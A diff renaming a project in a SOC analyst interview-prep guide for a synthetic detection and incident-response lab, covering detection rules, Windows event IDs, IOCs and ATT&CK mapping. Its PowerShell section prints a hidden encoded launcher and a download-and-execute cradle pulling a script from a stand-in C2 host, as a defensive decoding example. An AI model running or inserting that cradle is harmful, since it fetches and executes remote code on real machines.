@@ -1,19 +1,19 @@
-# SentinelLab — SOC Tier 1 Technical Interview Preparation Guide
+# ThreatWatch — SOC Tier 1 Technical Interview Preparation Guide
 
-A comprehensive, technically rigorous interview guide designed specifically for SOC Tier 1 / Junior Security Analyst interviews. Every question and answer is grounded directly in the real implementation of **SentinelLab**.
+A comprehensive, technically rigorous interview guide designed specifically for SOC Tier 1 / Junior Security Analyst interviews. Every question and answer is grounded directly in the real implementation of **ThreatWatch**.
 
 ---
 
 ## SECTION 1 — PROJECT OVERVIEW
 
-### 1. What is SentinelLab?
-**Answer:** SentinelLab is an offline, synthetic SOC Tier 1 attack detection and incident response simulation platform. It models the complete defensive lifecycle—from ingesting multi-source telemetry in a simulated SIEM to detecting threats via custom detection engineering logic, investigating correlated entities, pivoting across IOCs and MITRE ATT&CK techniques, executing containment playbooks, and compiling formal post-incident reports.
+### 1. What is ThreatWatch?
+**Answer:** ThreatWatch is an offline, synthetic SOC Tier 1 attack detection and incident response simulation platform. It models the complete defensive lifecycle—from ingesting multi-source telemetry in a simulated SIEM to detecting threats via custom detection engineering logic, investigating correlated entities, pivoting across IOCs and MITRE ATT&CK techniques, executing containment playbooks, and compiling formal post-incident reports.
 
-### 2. Why did you build SentinelLab?
-**Answer:** Most entry-level portfolio projects are static dashboards or read-only charts that do not demonstrate operational analyst thinking. Commercial SIEMs (like Splunk or Microsoft Sentinel) often require costly cloud infrastructure, while home labs like DetectionLab demand 32GB+ RAM to run multiple virtual machines. I built SentinelLab to provide a lightweight, deterministic, and instant-start environment that specifically demonstrates hands-on SOC L1 triage and incident response competencies.
+### 2. Why did you build ThreatWatch?
+**Answer:** Most entry-level portfolio projects are static dashboards or read-only charts that do not demonstrate operational analyst thinking. Commercial SIEMs (like Splunk or Microsoft Sentinel) often require costly cloud infrastructure, while home labs like DetectionLab demand 32GB+ RAM to run multiple virtual machines. I built ThreatWatch to provide a lightweight, deterministic, and instant-start environment that specifically demonstrates hands-on SOC L1 triage and incident response competencies.
 
 ### 3. What problem does it solve?
-**Answer:** Aspiring SOC analysts frequently struggle to bridge the gap between theoretical certifications (such as Security+ or CySA+) and practical, hands-on alert handling. SentinelLab solves this by providing realistic log telemetry, authentic Windows Event ID structures, guided scenario-based labs with automated scoring, and codified NIST/SANS incident response playbooks.
+**Answer:** Aspiring SOC analysts frequently struggle to bridge the gap between theoretical certifications (such as Security+ or CySA+) and practical, hands-on alert handling. ThreatWatch solves this by providing realistic log telemetry, authentic Windows Event ID structures, guided scenario-based labs with automated scoring, and codified NIST/SANS incident response playbooks.
 
 ### 4. Who is the target user?
 **Answer:** Aspiring Security Operations Center (SOC) Tier 1 analysts, blue team learners, cybersecurity students, and hiring managers/recruiters evaluating practical forensic triage and response skills.
@@ -28,8 +28,8 @@ A comprehensive, technically rigorous interview guide designed specifically for 
 
 ## SECTION 2 — ARCHITECTURE
 
-### 1. Explain the SentinelLab architecture.
-**Answer:** SentinelLab uses a modern client-server architecture:
+### 1. Explain the ThreatWatch architecture.
+**Answer:** ThreatWatch uses a modern client-server architecture:
 - **Presentation Layer**: Next.js 15 (React 19, TypeScript, Tailwind CSS) providing responsive SOC dashboards, log explorers, visual graph workspaces, and lab modules.
 - **API & Engine Layer**: FastAPI (Python 3.11+) delivering high-performance asynchronous REST endpoints, an in-memory rule detection engine, and a WebSocket broadcasting service.
 - **Persistence Layer**: SQLite with SQLAlchemy ORM storing security events, alert queues, incident records, threat intelligence IOCs, and playbooks.
@@ -61,7 +61,7 @@ A comprehensive, technically rigorous interview guide designed specifically for 
 ### 1. What is a SIEM?
 **Answer:** A SIEM (Security Information and Event Management) system centralizes the aggregation, normalization, analysis, and retention of security logs and telemetry across an enterprise's infrastructure, enabling real-time threat detection, automated alerting, and historical investigation.
 
-### 2. How does the SentinelLab SIEM explorer work?
+### 2. How does the ThreatWatch SIEM explorer work?
 **Answer:** Located at `/siem`, the SIEM explorer queries the `/api/events` endpoint with multi-criteria parameters. It displays events in an interactive data grid supporting full-text search across log messages and instant filtering by source (Windows, Firewall, DNS, Web Server), severity (Critical, High, Medium, Low, Informational), and hostname. Clicking any row expands parsed metadata alongside the raw event log.
 
 ### 3. What information is contained in an event record?
@@ -78,7 +78,7 @@ A comprehensive, technically rigorous interview guide designed specifically for 
 - `raw_log`: The exact unparsed log snippet (e.g. Windows XML EventLog or syslog string).
 - `mitre_technique`: Associated ATT&CK ID, if applicable.
 
-### 4. How do analysts filter events in SentinelLab?
+### 4. How do analysts filter events in ThreatWatch?
 **Answer:** Analysts can combine multiple dropdown filters (Severity, Source, Host) with an instant keyword search bar. For example, filtering by `Source: Windows` and typing `4625` isolates failed authentication events during brute force triage.
 
 ### 5. How does a raw event become an alert?
@@ -88,7 +88,7 @@ A comprehensive, technically rigorous interview guide designed specifically for 
 
 ## SECTION 4 — DETECTION ENGINE
 
-SentinelLab contains 7 active detection rules implemented in `backend/app/services/detection_engine.py`:
+ThreatWatch contains 7 active detection rules implemented in `backend/app/services/detection_engine.py`:
 
 ### Rule 1: `RULE-AUTH-001` — Brute Force Detection
 - **Input:** Windows Security Event ID 4625 (`FAILED_LOGIN`) or Linux SSH failed authentication logs.
@@ -158,19 +158,19 @@ SentinelLab contains 7 active detection rules implemented in `backend/app/servic
   - `IpAddress`: Source IP address of the logon attempt.
   - `Status` & `SubStatus`: Exact error code (e.g. `0xC000006A` = User name is correct, but password is bad; `0xC0000064` = User name does not exist; `0xC0000234` = Account currently locked out).
   - `LogonType`: Logon mechanism (Type 2 = Interactive; Type 3 = Network; Type 10 = RemoteInteractive / RDP).
-- **How SentinelLab uses it:** Populates brute force scenarios in Lab 1 and feeds `RULE-AUTH-001`.
+- **How ThreatWatch uses it:** Populates brute force scenarios in Lab 1 and feeds `RULE-AUTH-001`.
 
 ### Event ID 4624 — An Account Was Successfully Logged On
 - **What it represents:** Successful authentication and creation of a security logon session.
 - **Why it is useful:** Crucial during incident triage to establish whether an attacker successfully breached credentials following failed attempts.
 - **Key fields to inspect:** `TargetUserName`, `IpAddress`, `LogonType`, `AuthenticationPackageName`.
-- **How SentinelLab uses it:** Analysts search for Event 4624 immediately following bursts of 4625 to determine if password guessing resulted in an active breach.
+- **How ThreatWatch uses it:** Analysts search for Event 4624 immediately following bursts of 4625 to determine if password guessing resulted in an active breach.
 
 ### Event ID 4740 — A User Account Was Locked Out
 - **What it represents:** An Active Directory account locked out due to exceeding the maximum invalid logon attempts threshold.
 - **Why it is useful:** Signals that an attack reached lockout threshold, impacting legitimate user access or mitigating further brute force.
 - **Key fields to inspect:** `TargetUserName`, `CallerComputerName`.
-- **How SentinelLab uses it:** Generated at the conclusion of brute force simulation sequences to demonstrate defense-in-depth lockout mechanisms.
+- **How ThreatWatch uses it:** Generated at the conclusion of brute force simulation sequences to demonstrate defense-in-depth lockout mechanisms.
 
 ### Event ID 4688 — A New Process Has Been Created
 - **What it represents:** Process creation auditing recording execution of an application or binary.
@@ -179,7 +179,7 @@ SentinelLab contains 7 active detection rules implemented in `backend/app/servic
   - `NewProcessName`: Full path of binary executed.
   - `ProcessCommandLine`: Exact arguments passed to the process (requires command-line auditing policy enabled).
   - `CreatorProcessName`: Parent process that spawned the new process.
-- **How SentinelLab uses it:** Feeds `RULE-ENDPOINT-003` to inspect PowerShell command arguments and reconstruct parent-child process execution trees.
+- **How ThreatWatch uses it:** Feeds `RULE-ENDPOINT-003` to inspect PowerShell command arguments and reconstruct parent-child process execution trees.
 
 ---
 
@@ -194,8 +194,8 @@ SentinelLab contains 7 active detection rules implemented in `backend/app/servic
 ### 3. What does `-EncodedCommand` mean?
 **Answer:** It instructs PowerShell to accept a command encoded as a Base64 Unicode string. For example, `powershell.exe -enc SQBFAFgA...` decodes into executable PowerShell instructions.
 
-### 4. How does SentinelLab inspect it?
-**Answer:** SentinelLab's Windows Security page (`/windows`) features a dedicated Base64 decoder. When an analyst clicks **Decode Base64**, the frontend safely decodes the Unicode string in memory, displaying the human-readable script:
+### 4. How does ThreatWatch inspect it?
+**Answer:** ThreatWatch's Windows Security page (`/windows`) features a dedicated Base64 decoder. When an analyst clicks **Decode Base64**, the frontend safely decodes the Unicode string in memory, displaying the human-readable script:
 ```powershell
 powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgA...
 # Decoded:
@@ -242,8 +242,8 @@ IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps
 ### 1. What is an Indicator of Compromise (IOC)?
 **Answer:** An IOC is forensic evidence of potential intrusion or malicious activity observed on a host or network. Common examples include file hashes, IP addresses, domain names, URLs, and registry keys.
 
-### 2. What IOC types does SentinelLab support?
-**Answer:** The SentinelLab Threat Intelligence database (`/iocs`) categorizes 7 distinct indicator types:
+### 2. What IOC types does ThreatWatch support?
+**Answer:** The ThreatWatch Threat Intelligence database (`/iocs`) categorizes 7 distinct indicator types:
 1. `IP`: Attacker infrastructure and C2 servers (e.g. `45.33.32.156`, `198.51.100.23`).
 2. `Domain`: Typosquatted and staging domains (e.g. `malicious-c2.net`, `bankofamer1ca-notice.com`).
 3. `URL`: Staging download URLs (e.g. `http://malicious-c2.net/invoke.ps1`).
@@ -252,7 +252,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps
 6. `Email`: Malicious sender addresses.
 7. `Username`: Compromised accounts subject to credential abuse.
 
-### 3. How does IOC correlation work in SentinelLab?
+### 3. How does IOC correlation work in ThreatWatch?
 **Answer:** In `RULE-IOC-005` and the Investigation Workspace, raw logs are matched against the IOC repository. When an event references a known indicator, the system flags a Critical alert and establishes a relational link in the investigation graph between the event, the host, and the threat actor's infrastructure.
 
 ### 4. How does a SOC analyst validate an IOC?
@@ -265,9 +265,9 @@ IEX (New-Object Net.WebClient).DownloadString('http://malicious-c2.net/invoke.ps
 
 ## SECTION 9 — MITRE ATT&CK FRAMEWORK
 
-SentinelLab incorporates 7 core MITRE ATT&CK Enterprise techniques across its detection rules and labs:
+ThreatWatch incorporates 7 core MITRE ATT&CK Enterprise techniques across its detection rules and labs:
 
-| Technique ID | Technique Name | Tactic | Why Activity Maps to Technique | SentinelLab UI Display |
+| Technique ID | Technique Name | Tactic | Why Activity Maps to Technique | ThreatWatch UI Display |
 | :--- | :--- | :--- | :--- | :--- |
 | `T1110.001` | Password Guessing | Credential Access | Rapid sequential authentication attempts against valid accounts using automated credential wordlists. | Displayed on Alert details, SIEM events, and Lab 1 overview. |
 | `T1046` | Network Service Scanning | Discovery | Systematic probing of sequential TCP destination ports on perimeter hosts to enumerate listening services. | Displayed on Port Scan alerts and Lab 2 evidence card. |
@@ -291,7 +291,7 @@ SentinelLab incorporates 7 core MITRE ATT&CK Enterprise techniques across its de
 - **Evidence of Success**: An attack that succeeded (e.g. failed logins followed by successful login) is prioritized over blocked attempts.
 
 ### 3. What is Containment?
-**Answer:** Immediate actions taken to limit the blast radius and prevent an attacker from expanding access or exfiltrating data. In SentinelLab, analysts execute:
+**Answer:** Immediate actions taken to limit the blast radius and prevent an attacker from expanding access or exfiltrating data. In ThreatWatch, analysts execute:
 - **Host Quarantine**: Disconnecting network interfaces.
 - **IP Perimeter Block**: Dropping external attacker IPs at the firewall.
 - **Account Lockout**: Revoking compromised Active Directory sessions.
@@ -302,17 +302,17 @@ SentinelLab incorporates 7 core MITRE ATT&CK Enterprise techniques across its de
 ### 5. What is Recovery?
 **Answer:** Restoring affected systems to safe production operations, resetting user credentials, validating clean baseline telemetry, and conducting enhanced monitoring.
 
-### 6. How does SentinelLab simulate response?
+### 6. How does ThreatWatch simulate response?
 **Answer:** In the Incident details view (`/incidents`), analysts can click interactive containment triggers (e.g. **Isolate Host**, **Block IP**, **Revoke Token**). These actions are appended to the audit timeline, and the incident status advances to `Contained`.
 
 ---
 
 ## SECTION 11 — ARCHITECTURAL LIMITATIONS
 
-### "What can SentinelLab NOT do?"
+### "What can ThreatWatch NOT do?"
 **Honest, defensible answers for interviews:**
 1. **Synthetic Telemetry**: The events are generated from realistic synthetic templates and probabilistic models rather than real operating system kernels.
-2. **No Real Enterprise SIEM Ingestion**: SentinelLab runs its own lightweight detection engine in Python; it does not currently ingest logs from Splunk forwarders, Elastic beats, or Azure Event Hubs.
+2. **No Real Enterprise SIEM Ingestion**: ThreatWatch runs its own lightweight detection engine in Python; it does not currently ingest logs from Splunk forwarders, Elastic beats, or Azure Event Hubs.
 3. **No Real Endpoint Agents**: Telemetry is simulated; there are no active Sysmon or CrowdStrike Falcon sensor agents installed on production endpoints.
 4. **No Real Attack Traffic**: All network flows and attacks are simulated against memory and SQLite; no live packets traverse the public Internet.
 5. **Single-Node Architecture**: Designed as a standalone local laboratory rather than a distributed multi-tenant cloud deployment.
@@ -321,8 +321,8 @@ SentinelLab incorporates 7 core MITRE ATT&CK Enterprise techniques across its de
 
 ## SECTION 12 — FUTURE IMPROVEMENTS
 
-### Realistic engineering enhancements planned for SentinelLab:
-1. **External SIEM Integration**: Add log forwarding exporters (Syslog over TLS, Splunk HEC) to stream SentinelLab telemetry into real enterprise SIEM tools.
+### Realistic engineering enhancements planned for ThreatWatch:
+1. **External SIEM Integration**: Add log forwarding exporters (Syslog over TLS, Splunk HEC) to stream ThreatWatch telemetry into real enterprise SIEM tools.
 2. **Windows Event Forwarding (WEF) Collector**: Build a Windows agent capable of harvesting actual Event IDs from live VMs.
 3. **Threat Intelligence API Integration**: Connect the IOC repository to live API lookups (VirusTotal, AbuseIPDB, AlienVault OTX).
 4. **Multi-Tenant Authentication & RBAC**: Implement OAuth2 / JWT authentication with separate roles for Trainee, Analyst, and SOC Lead.
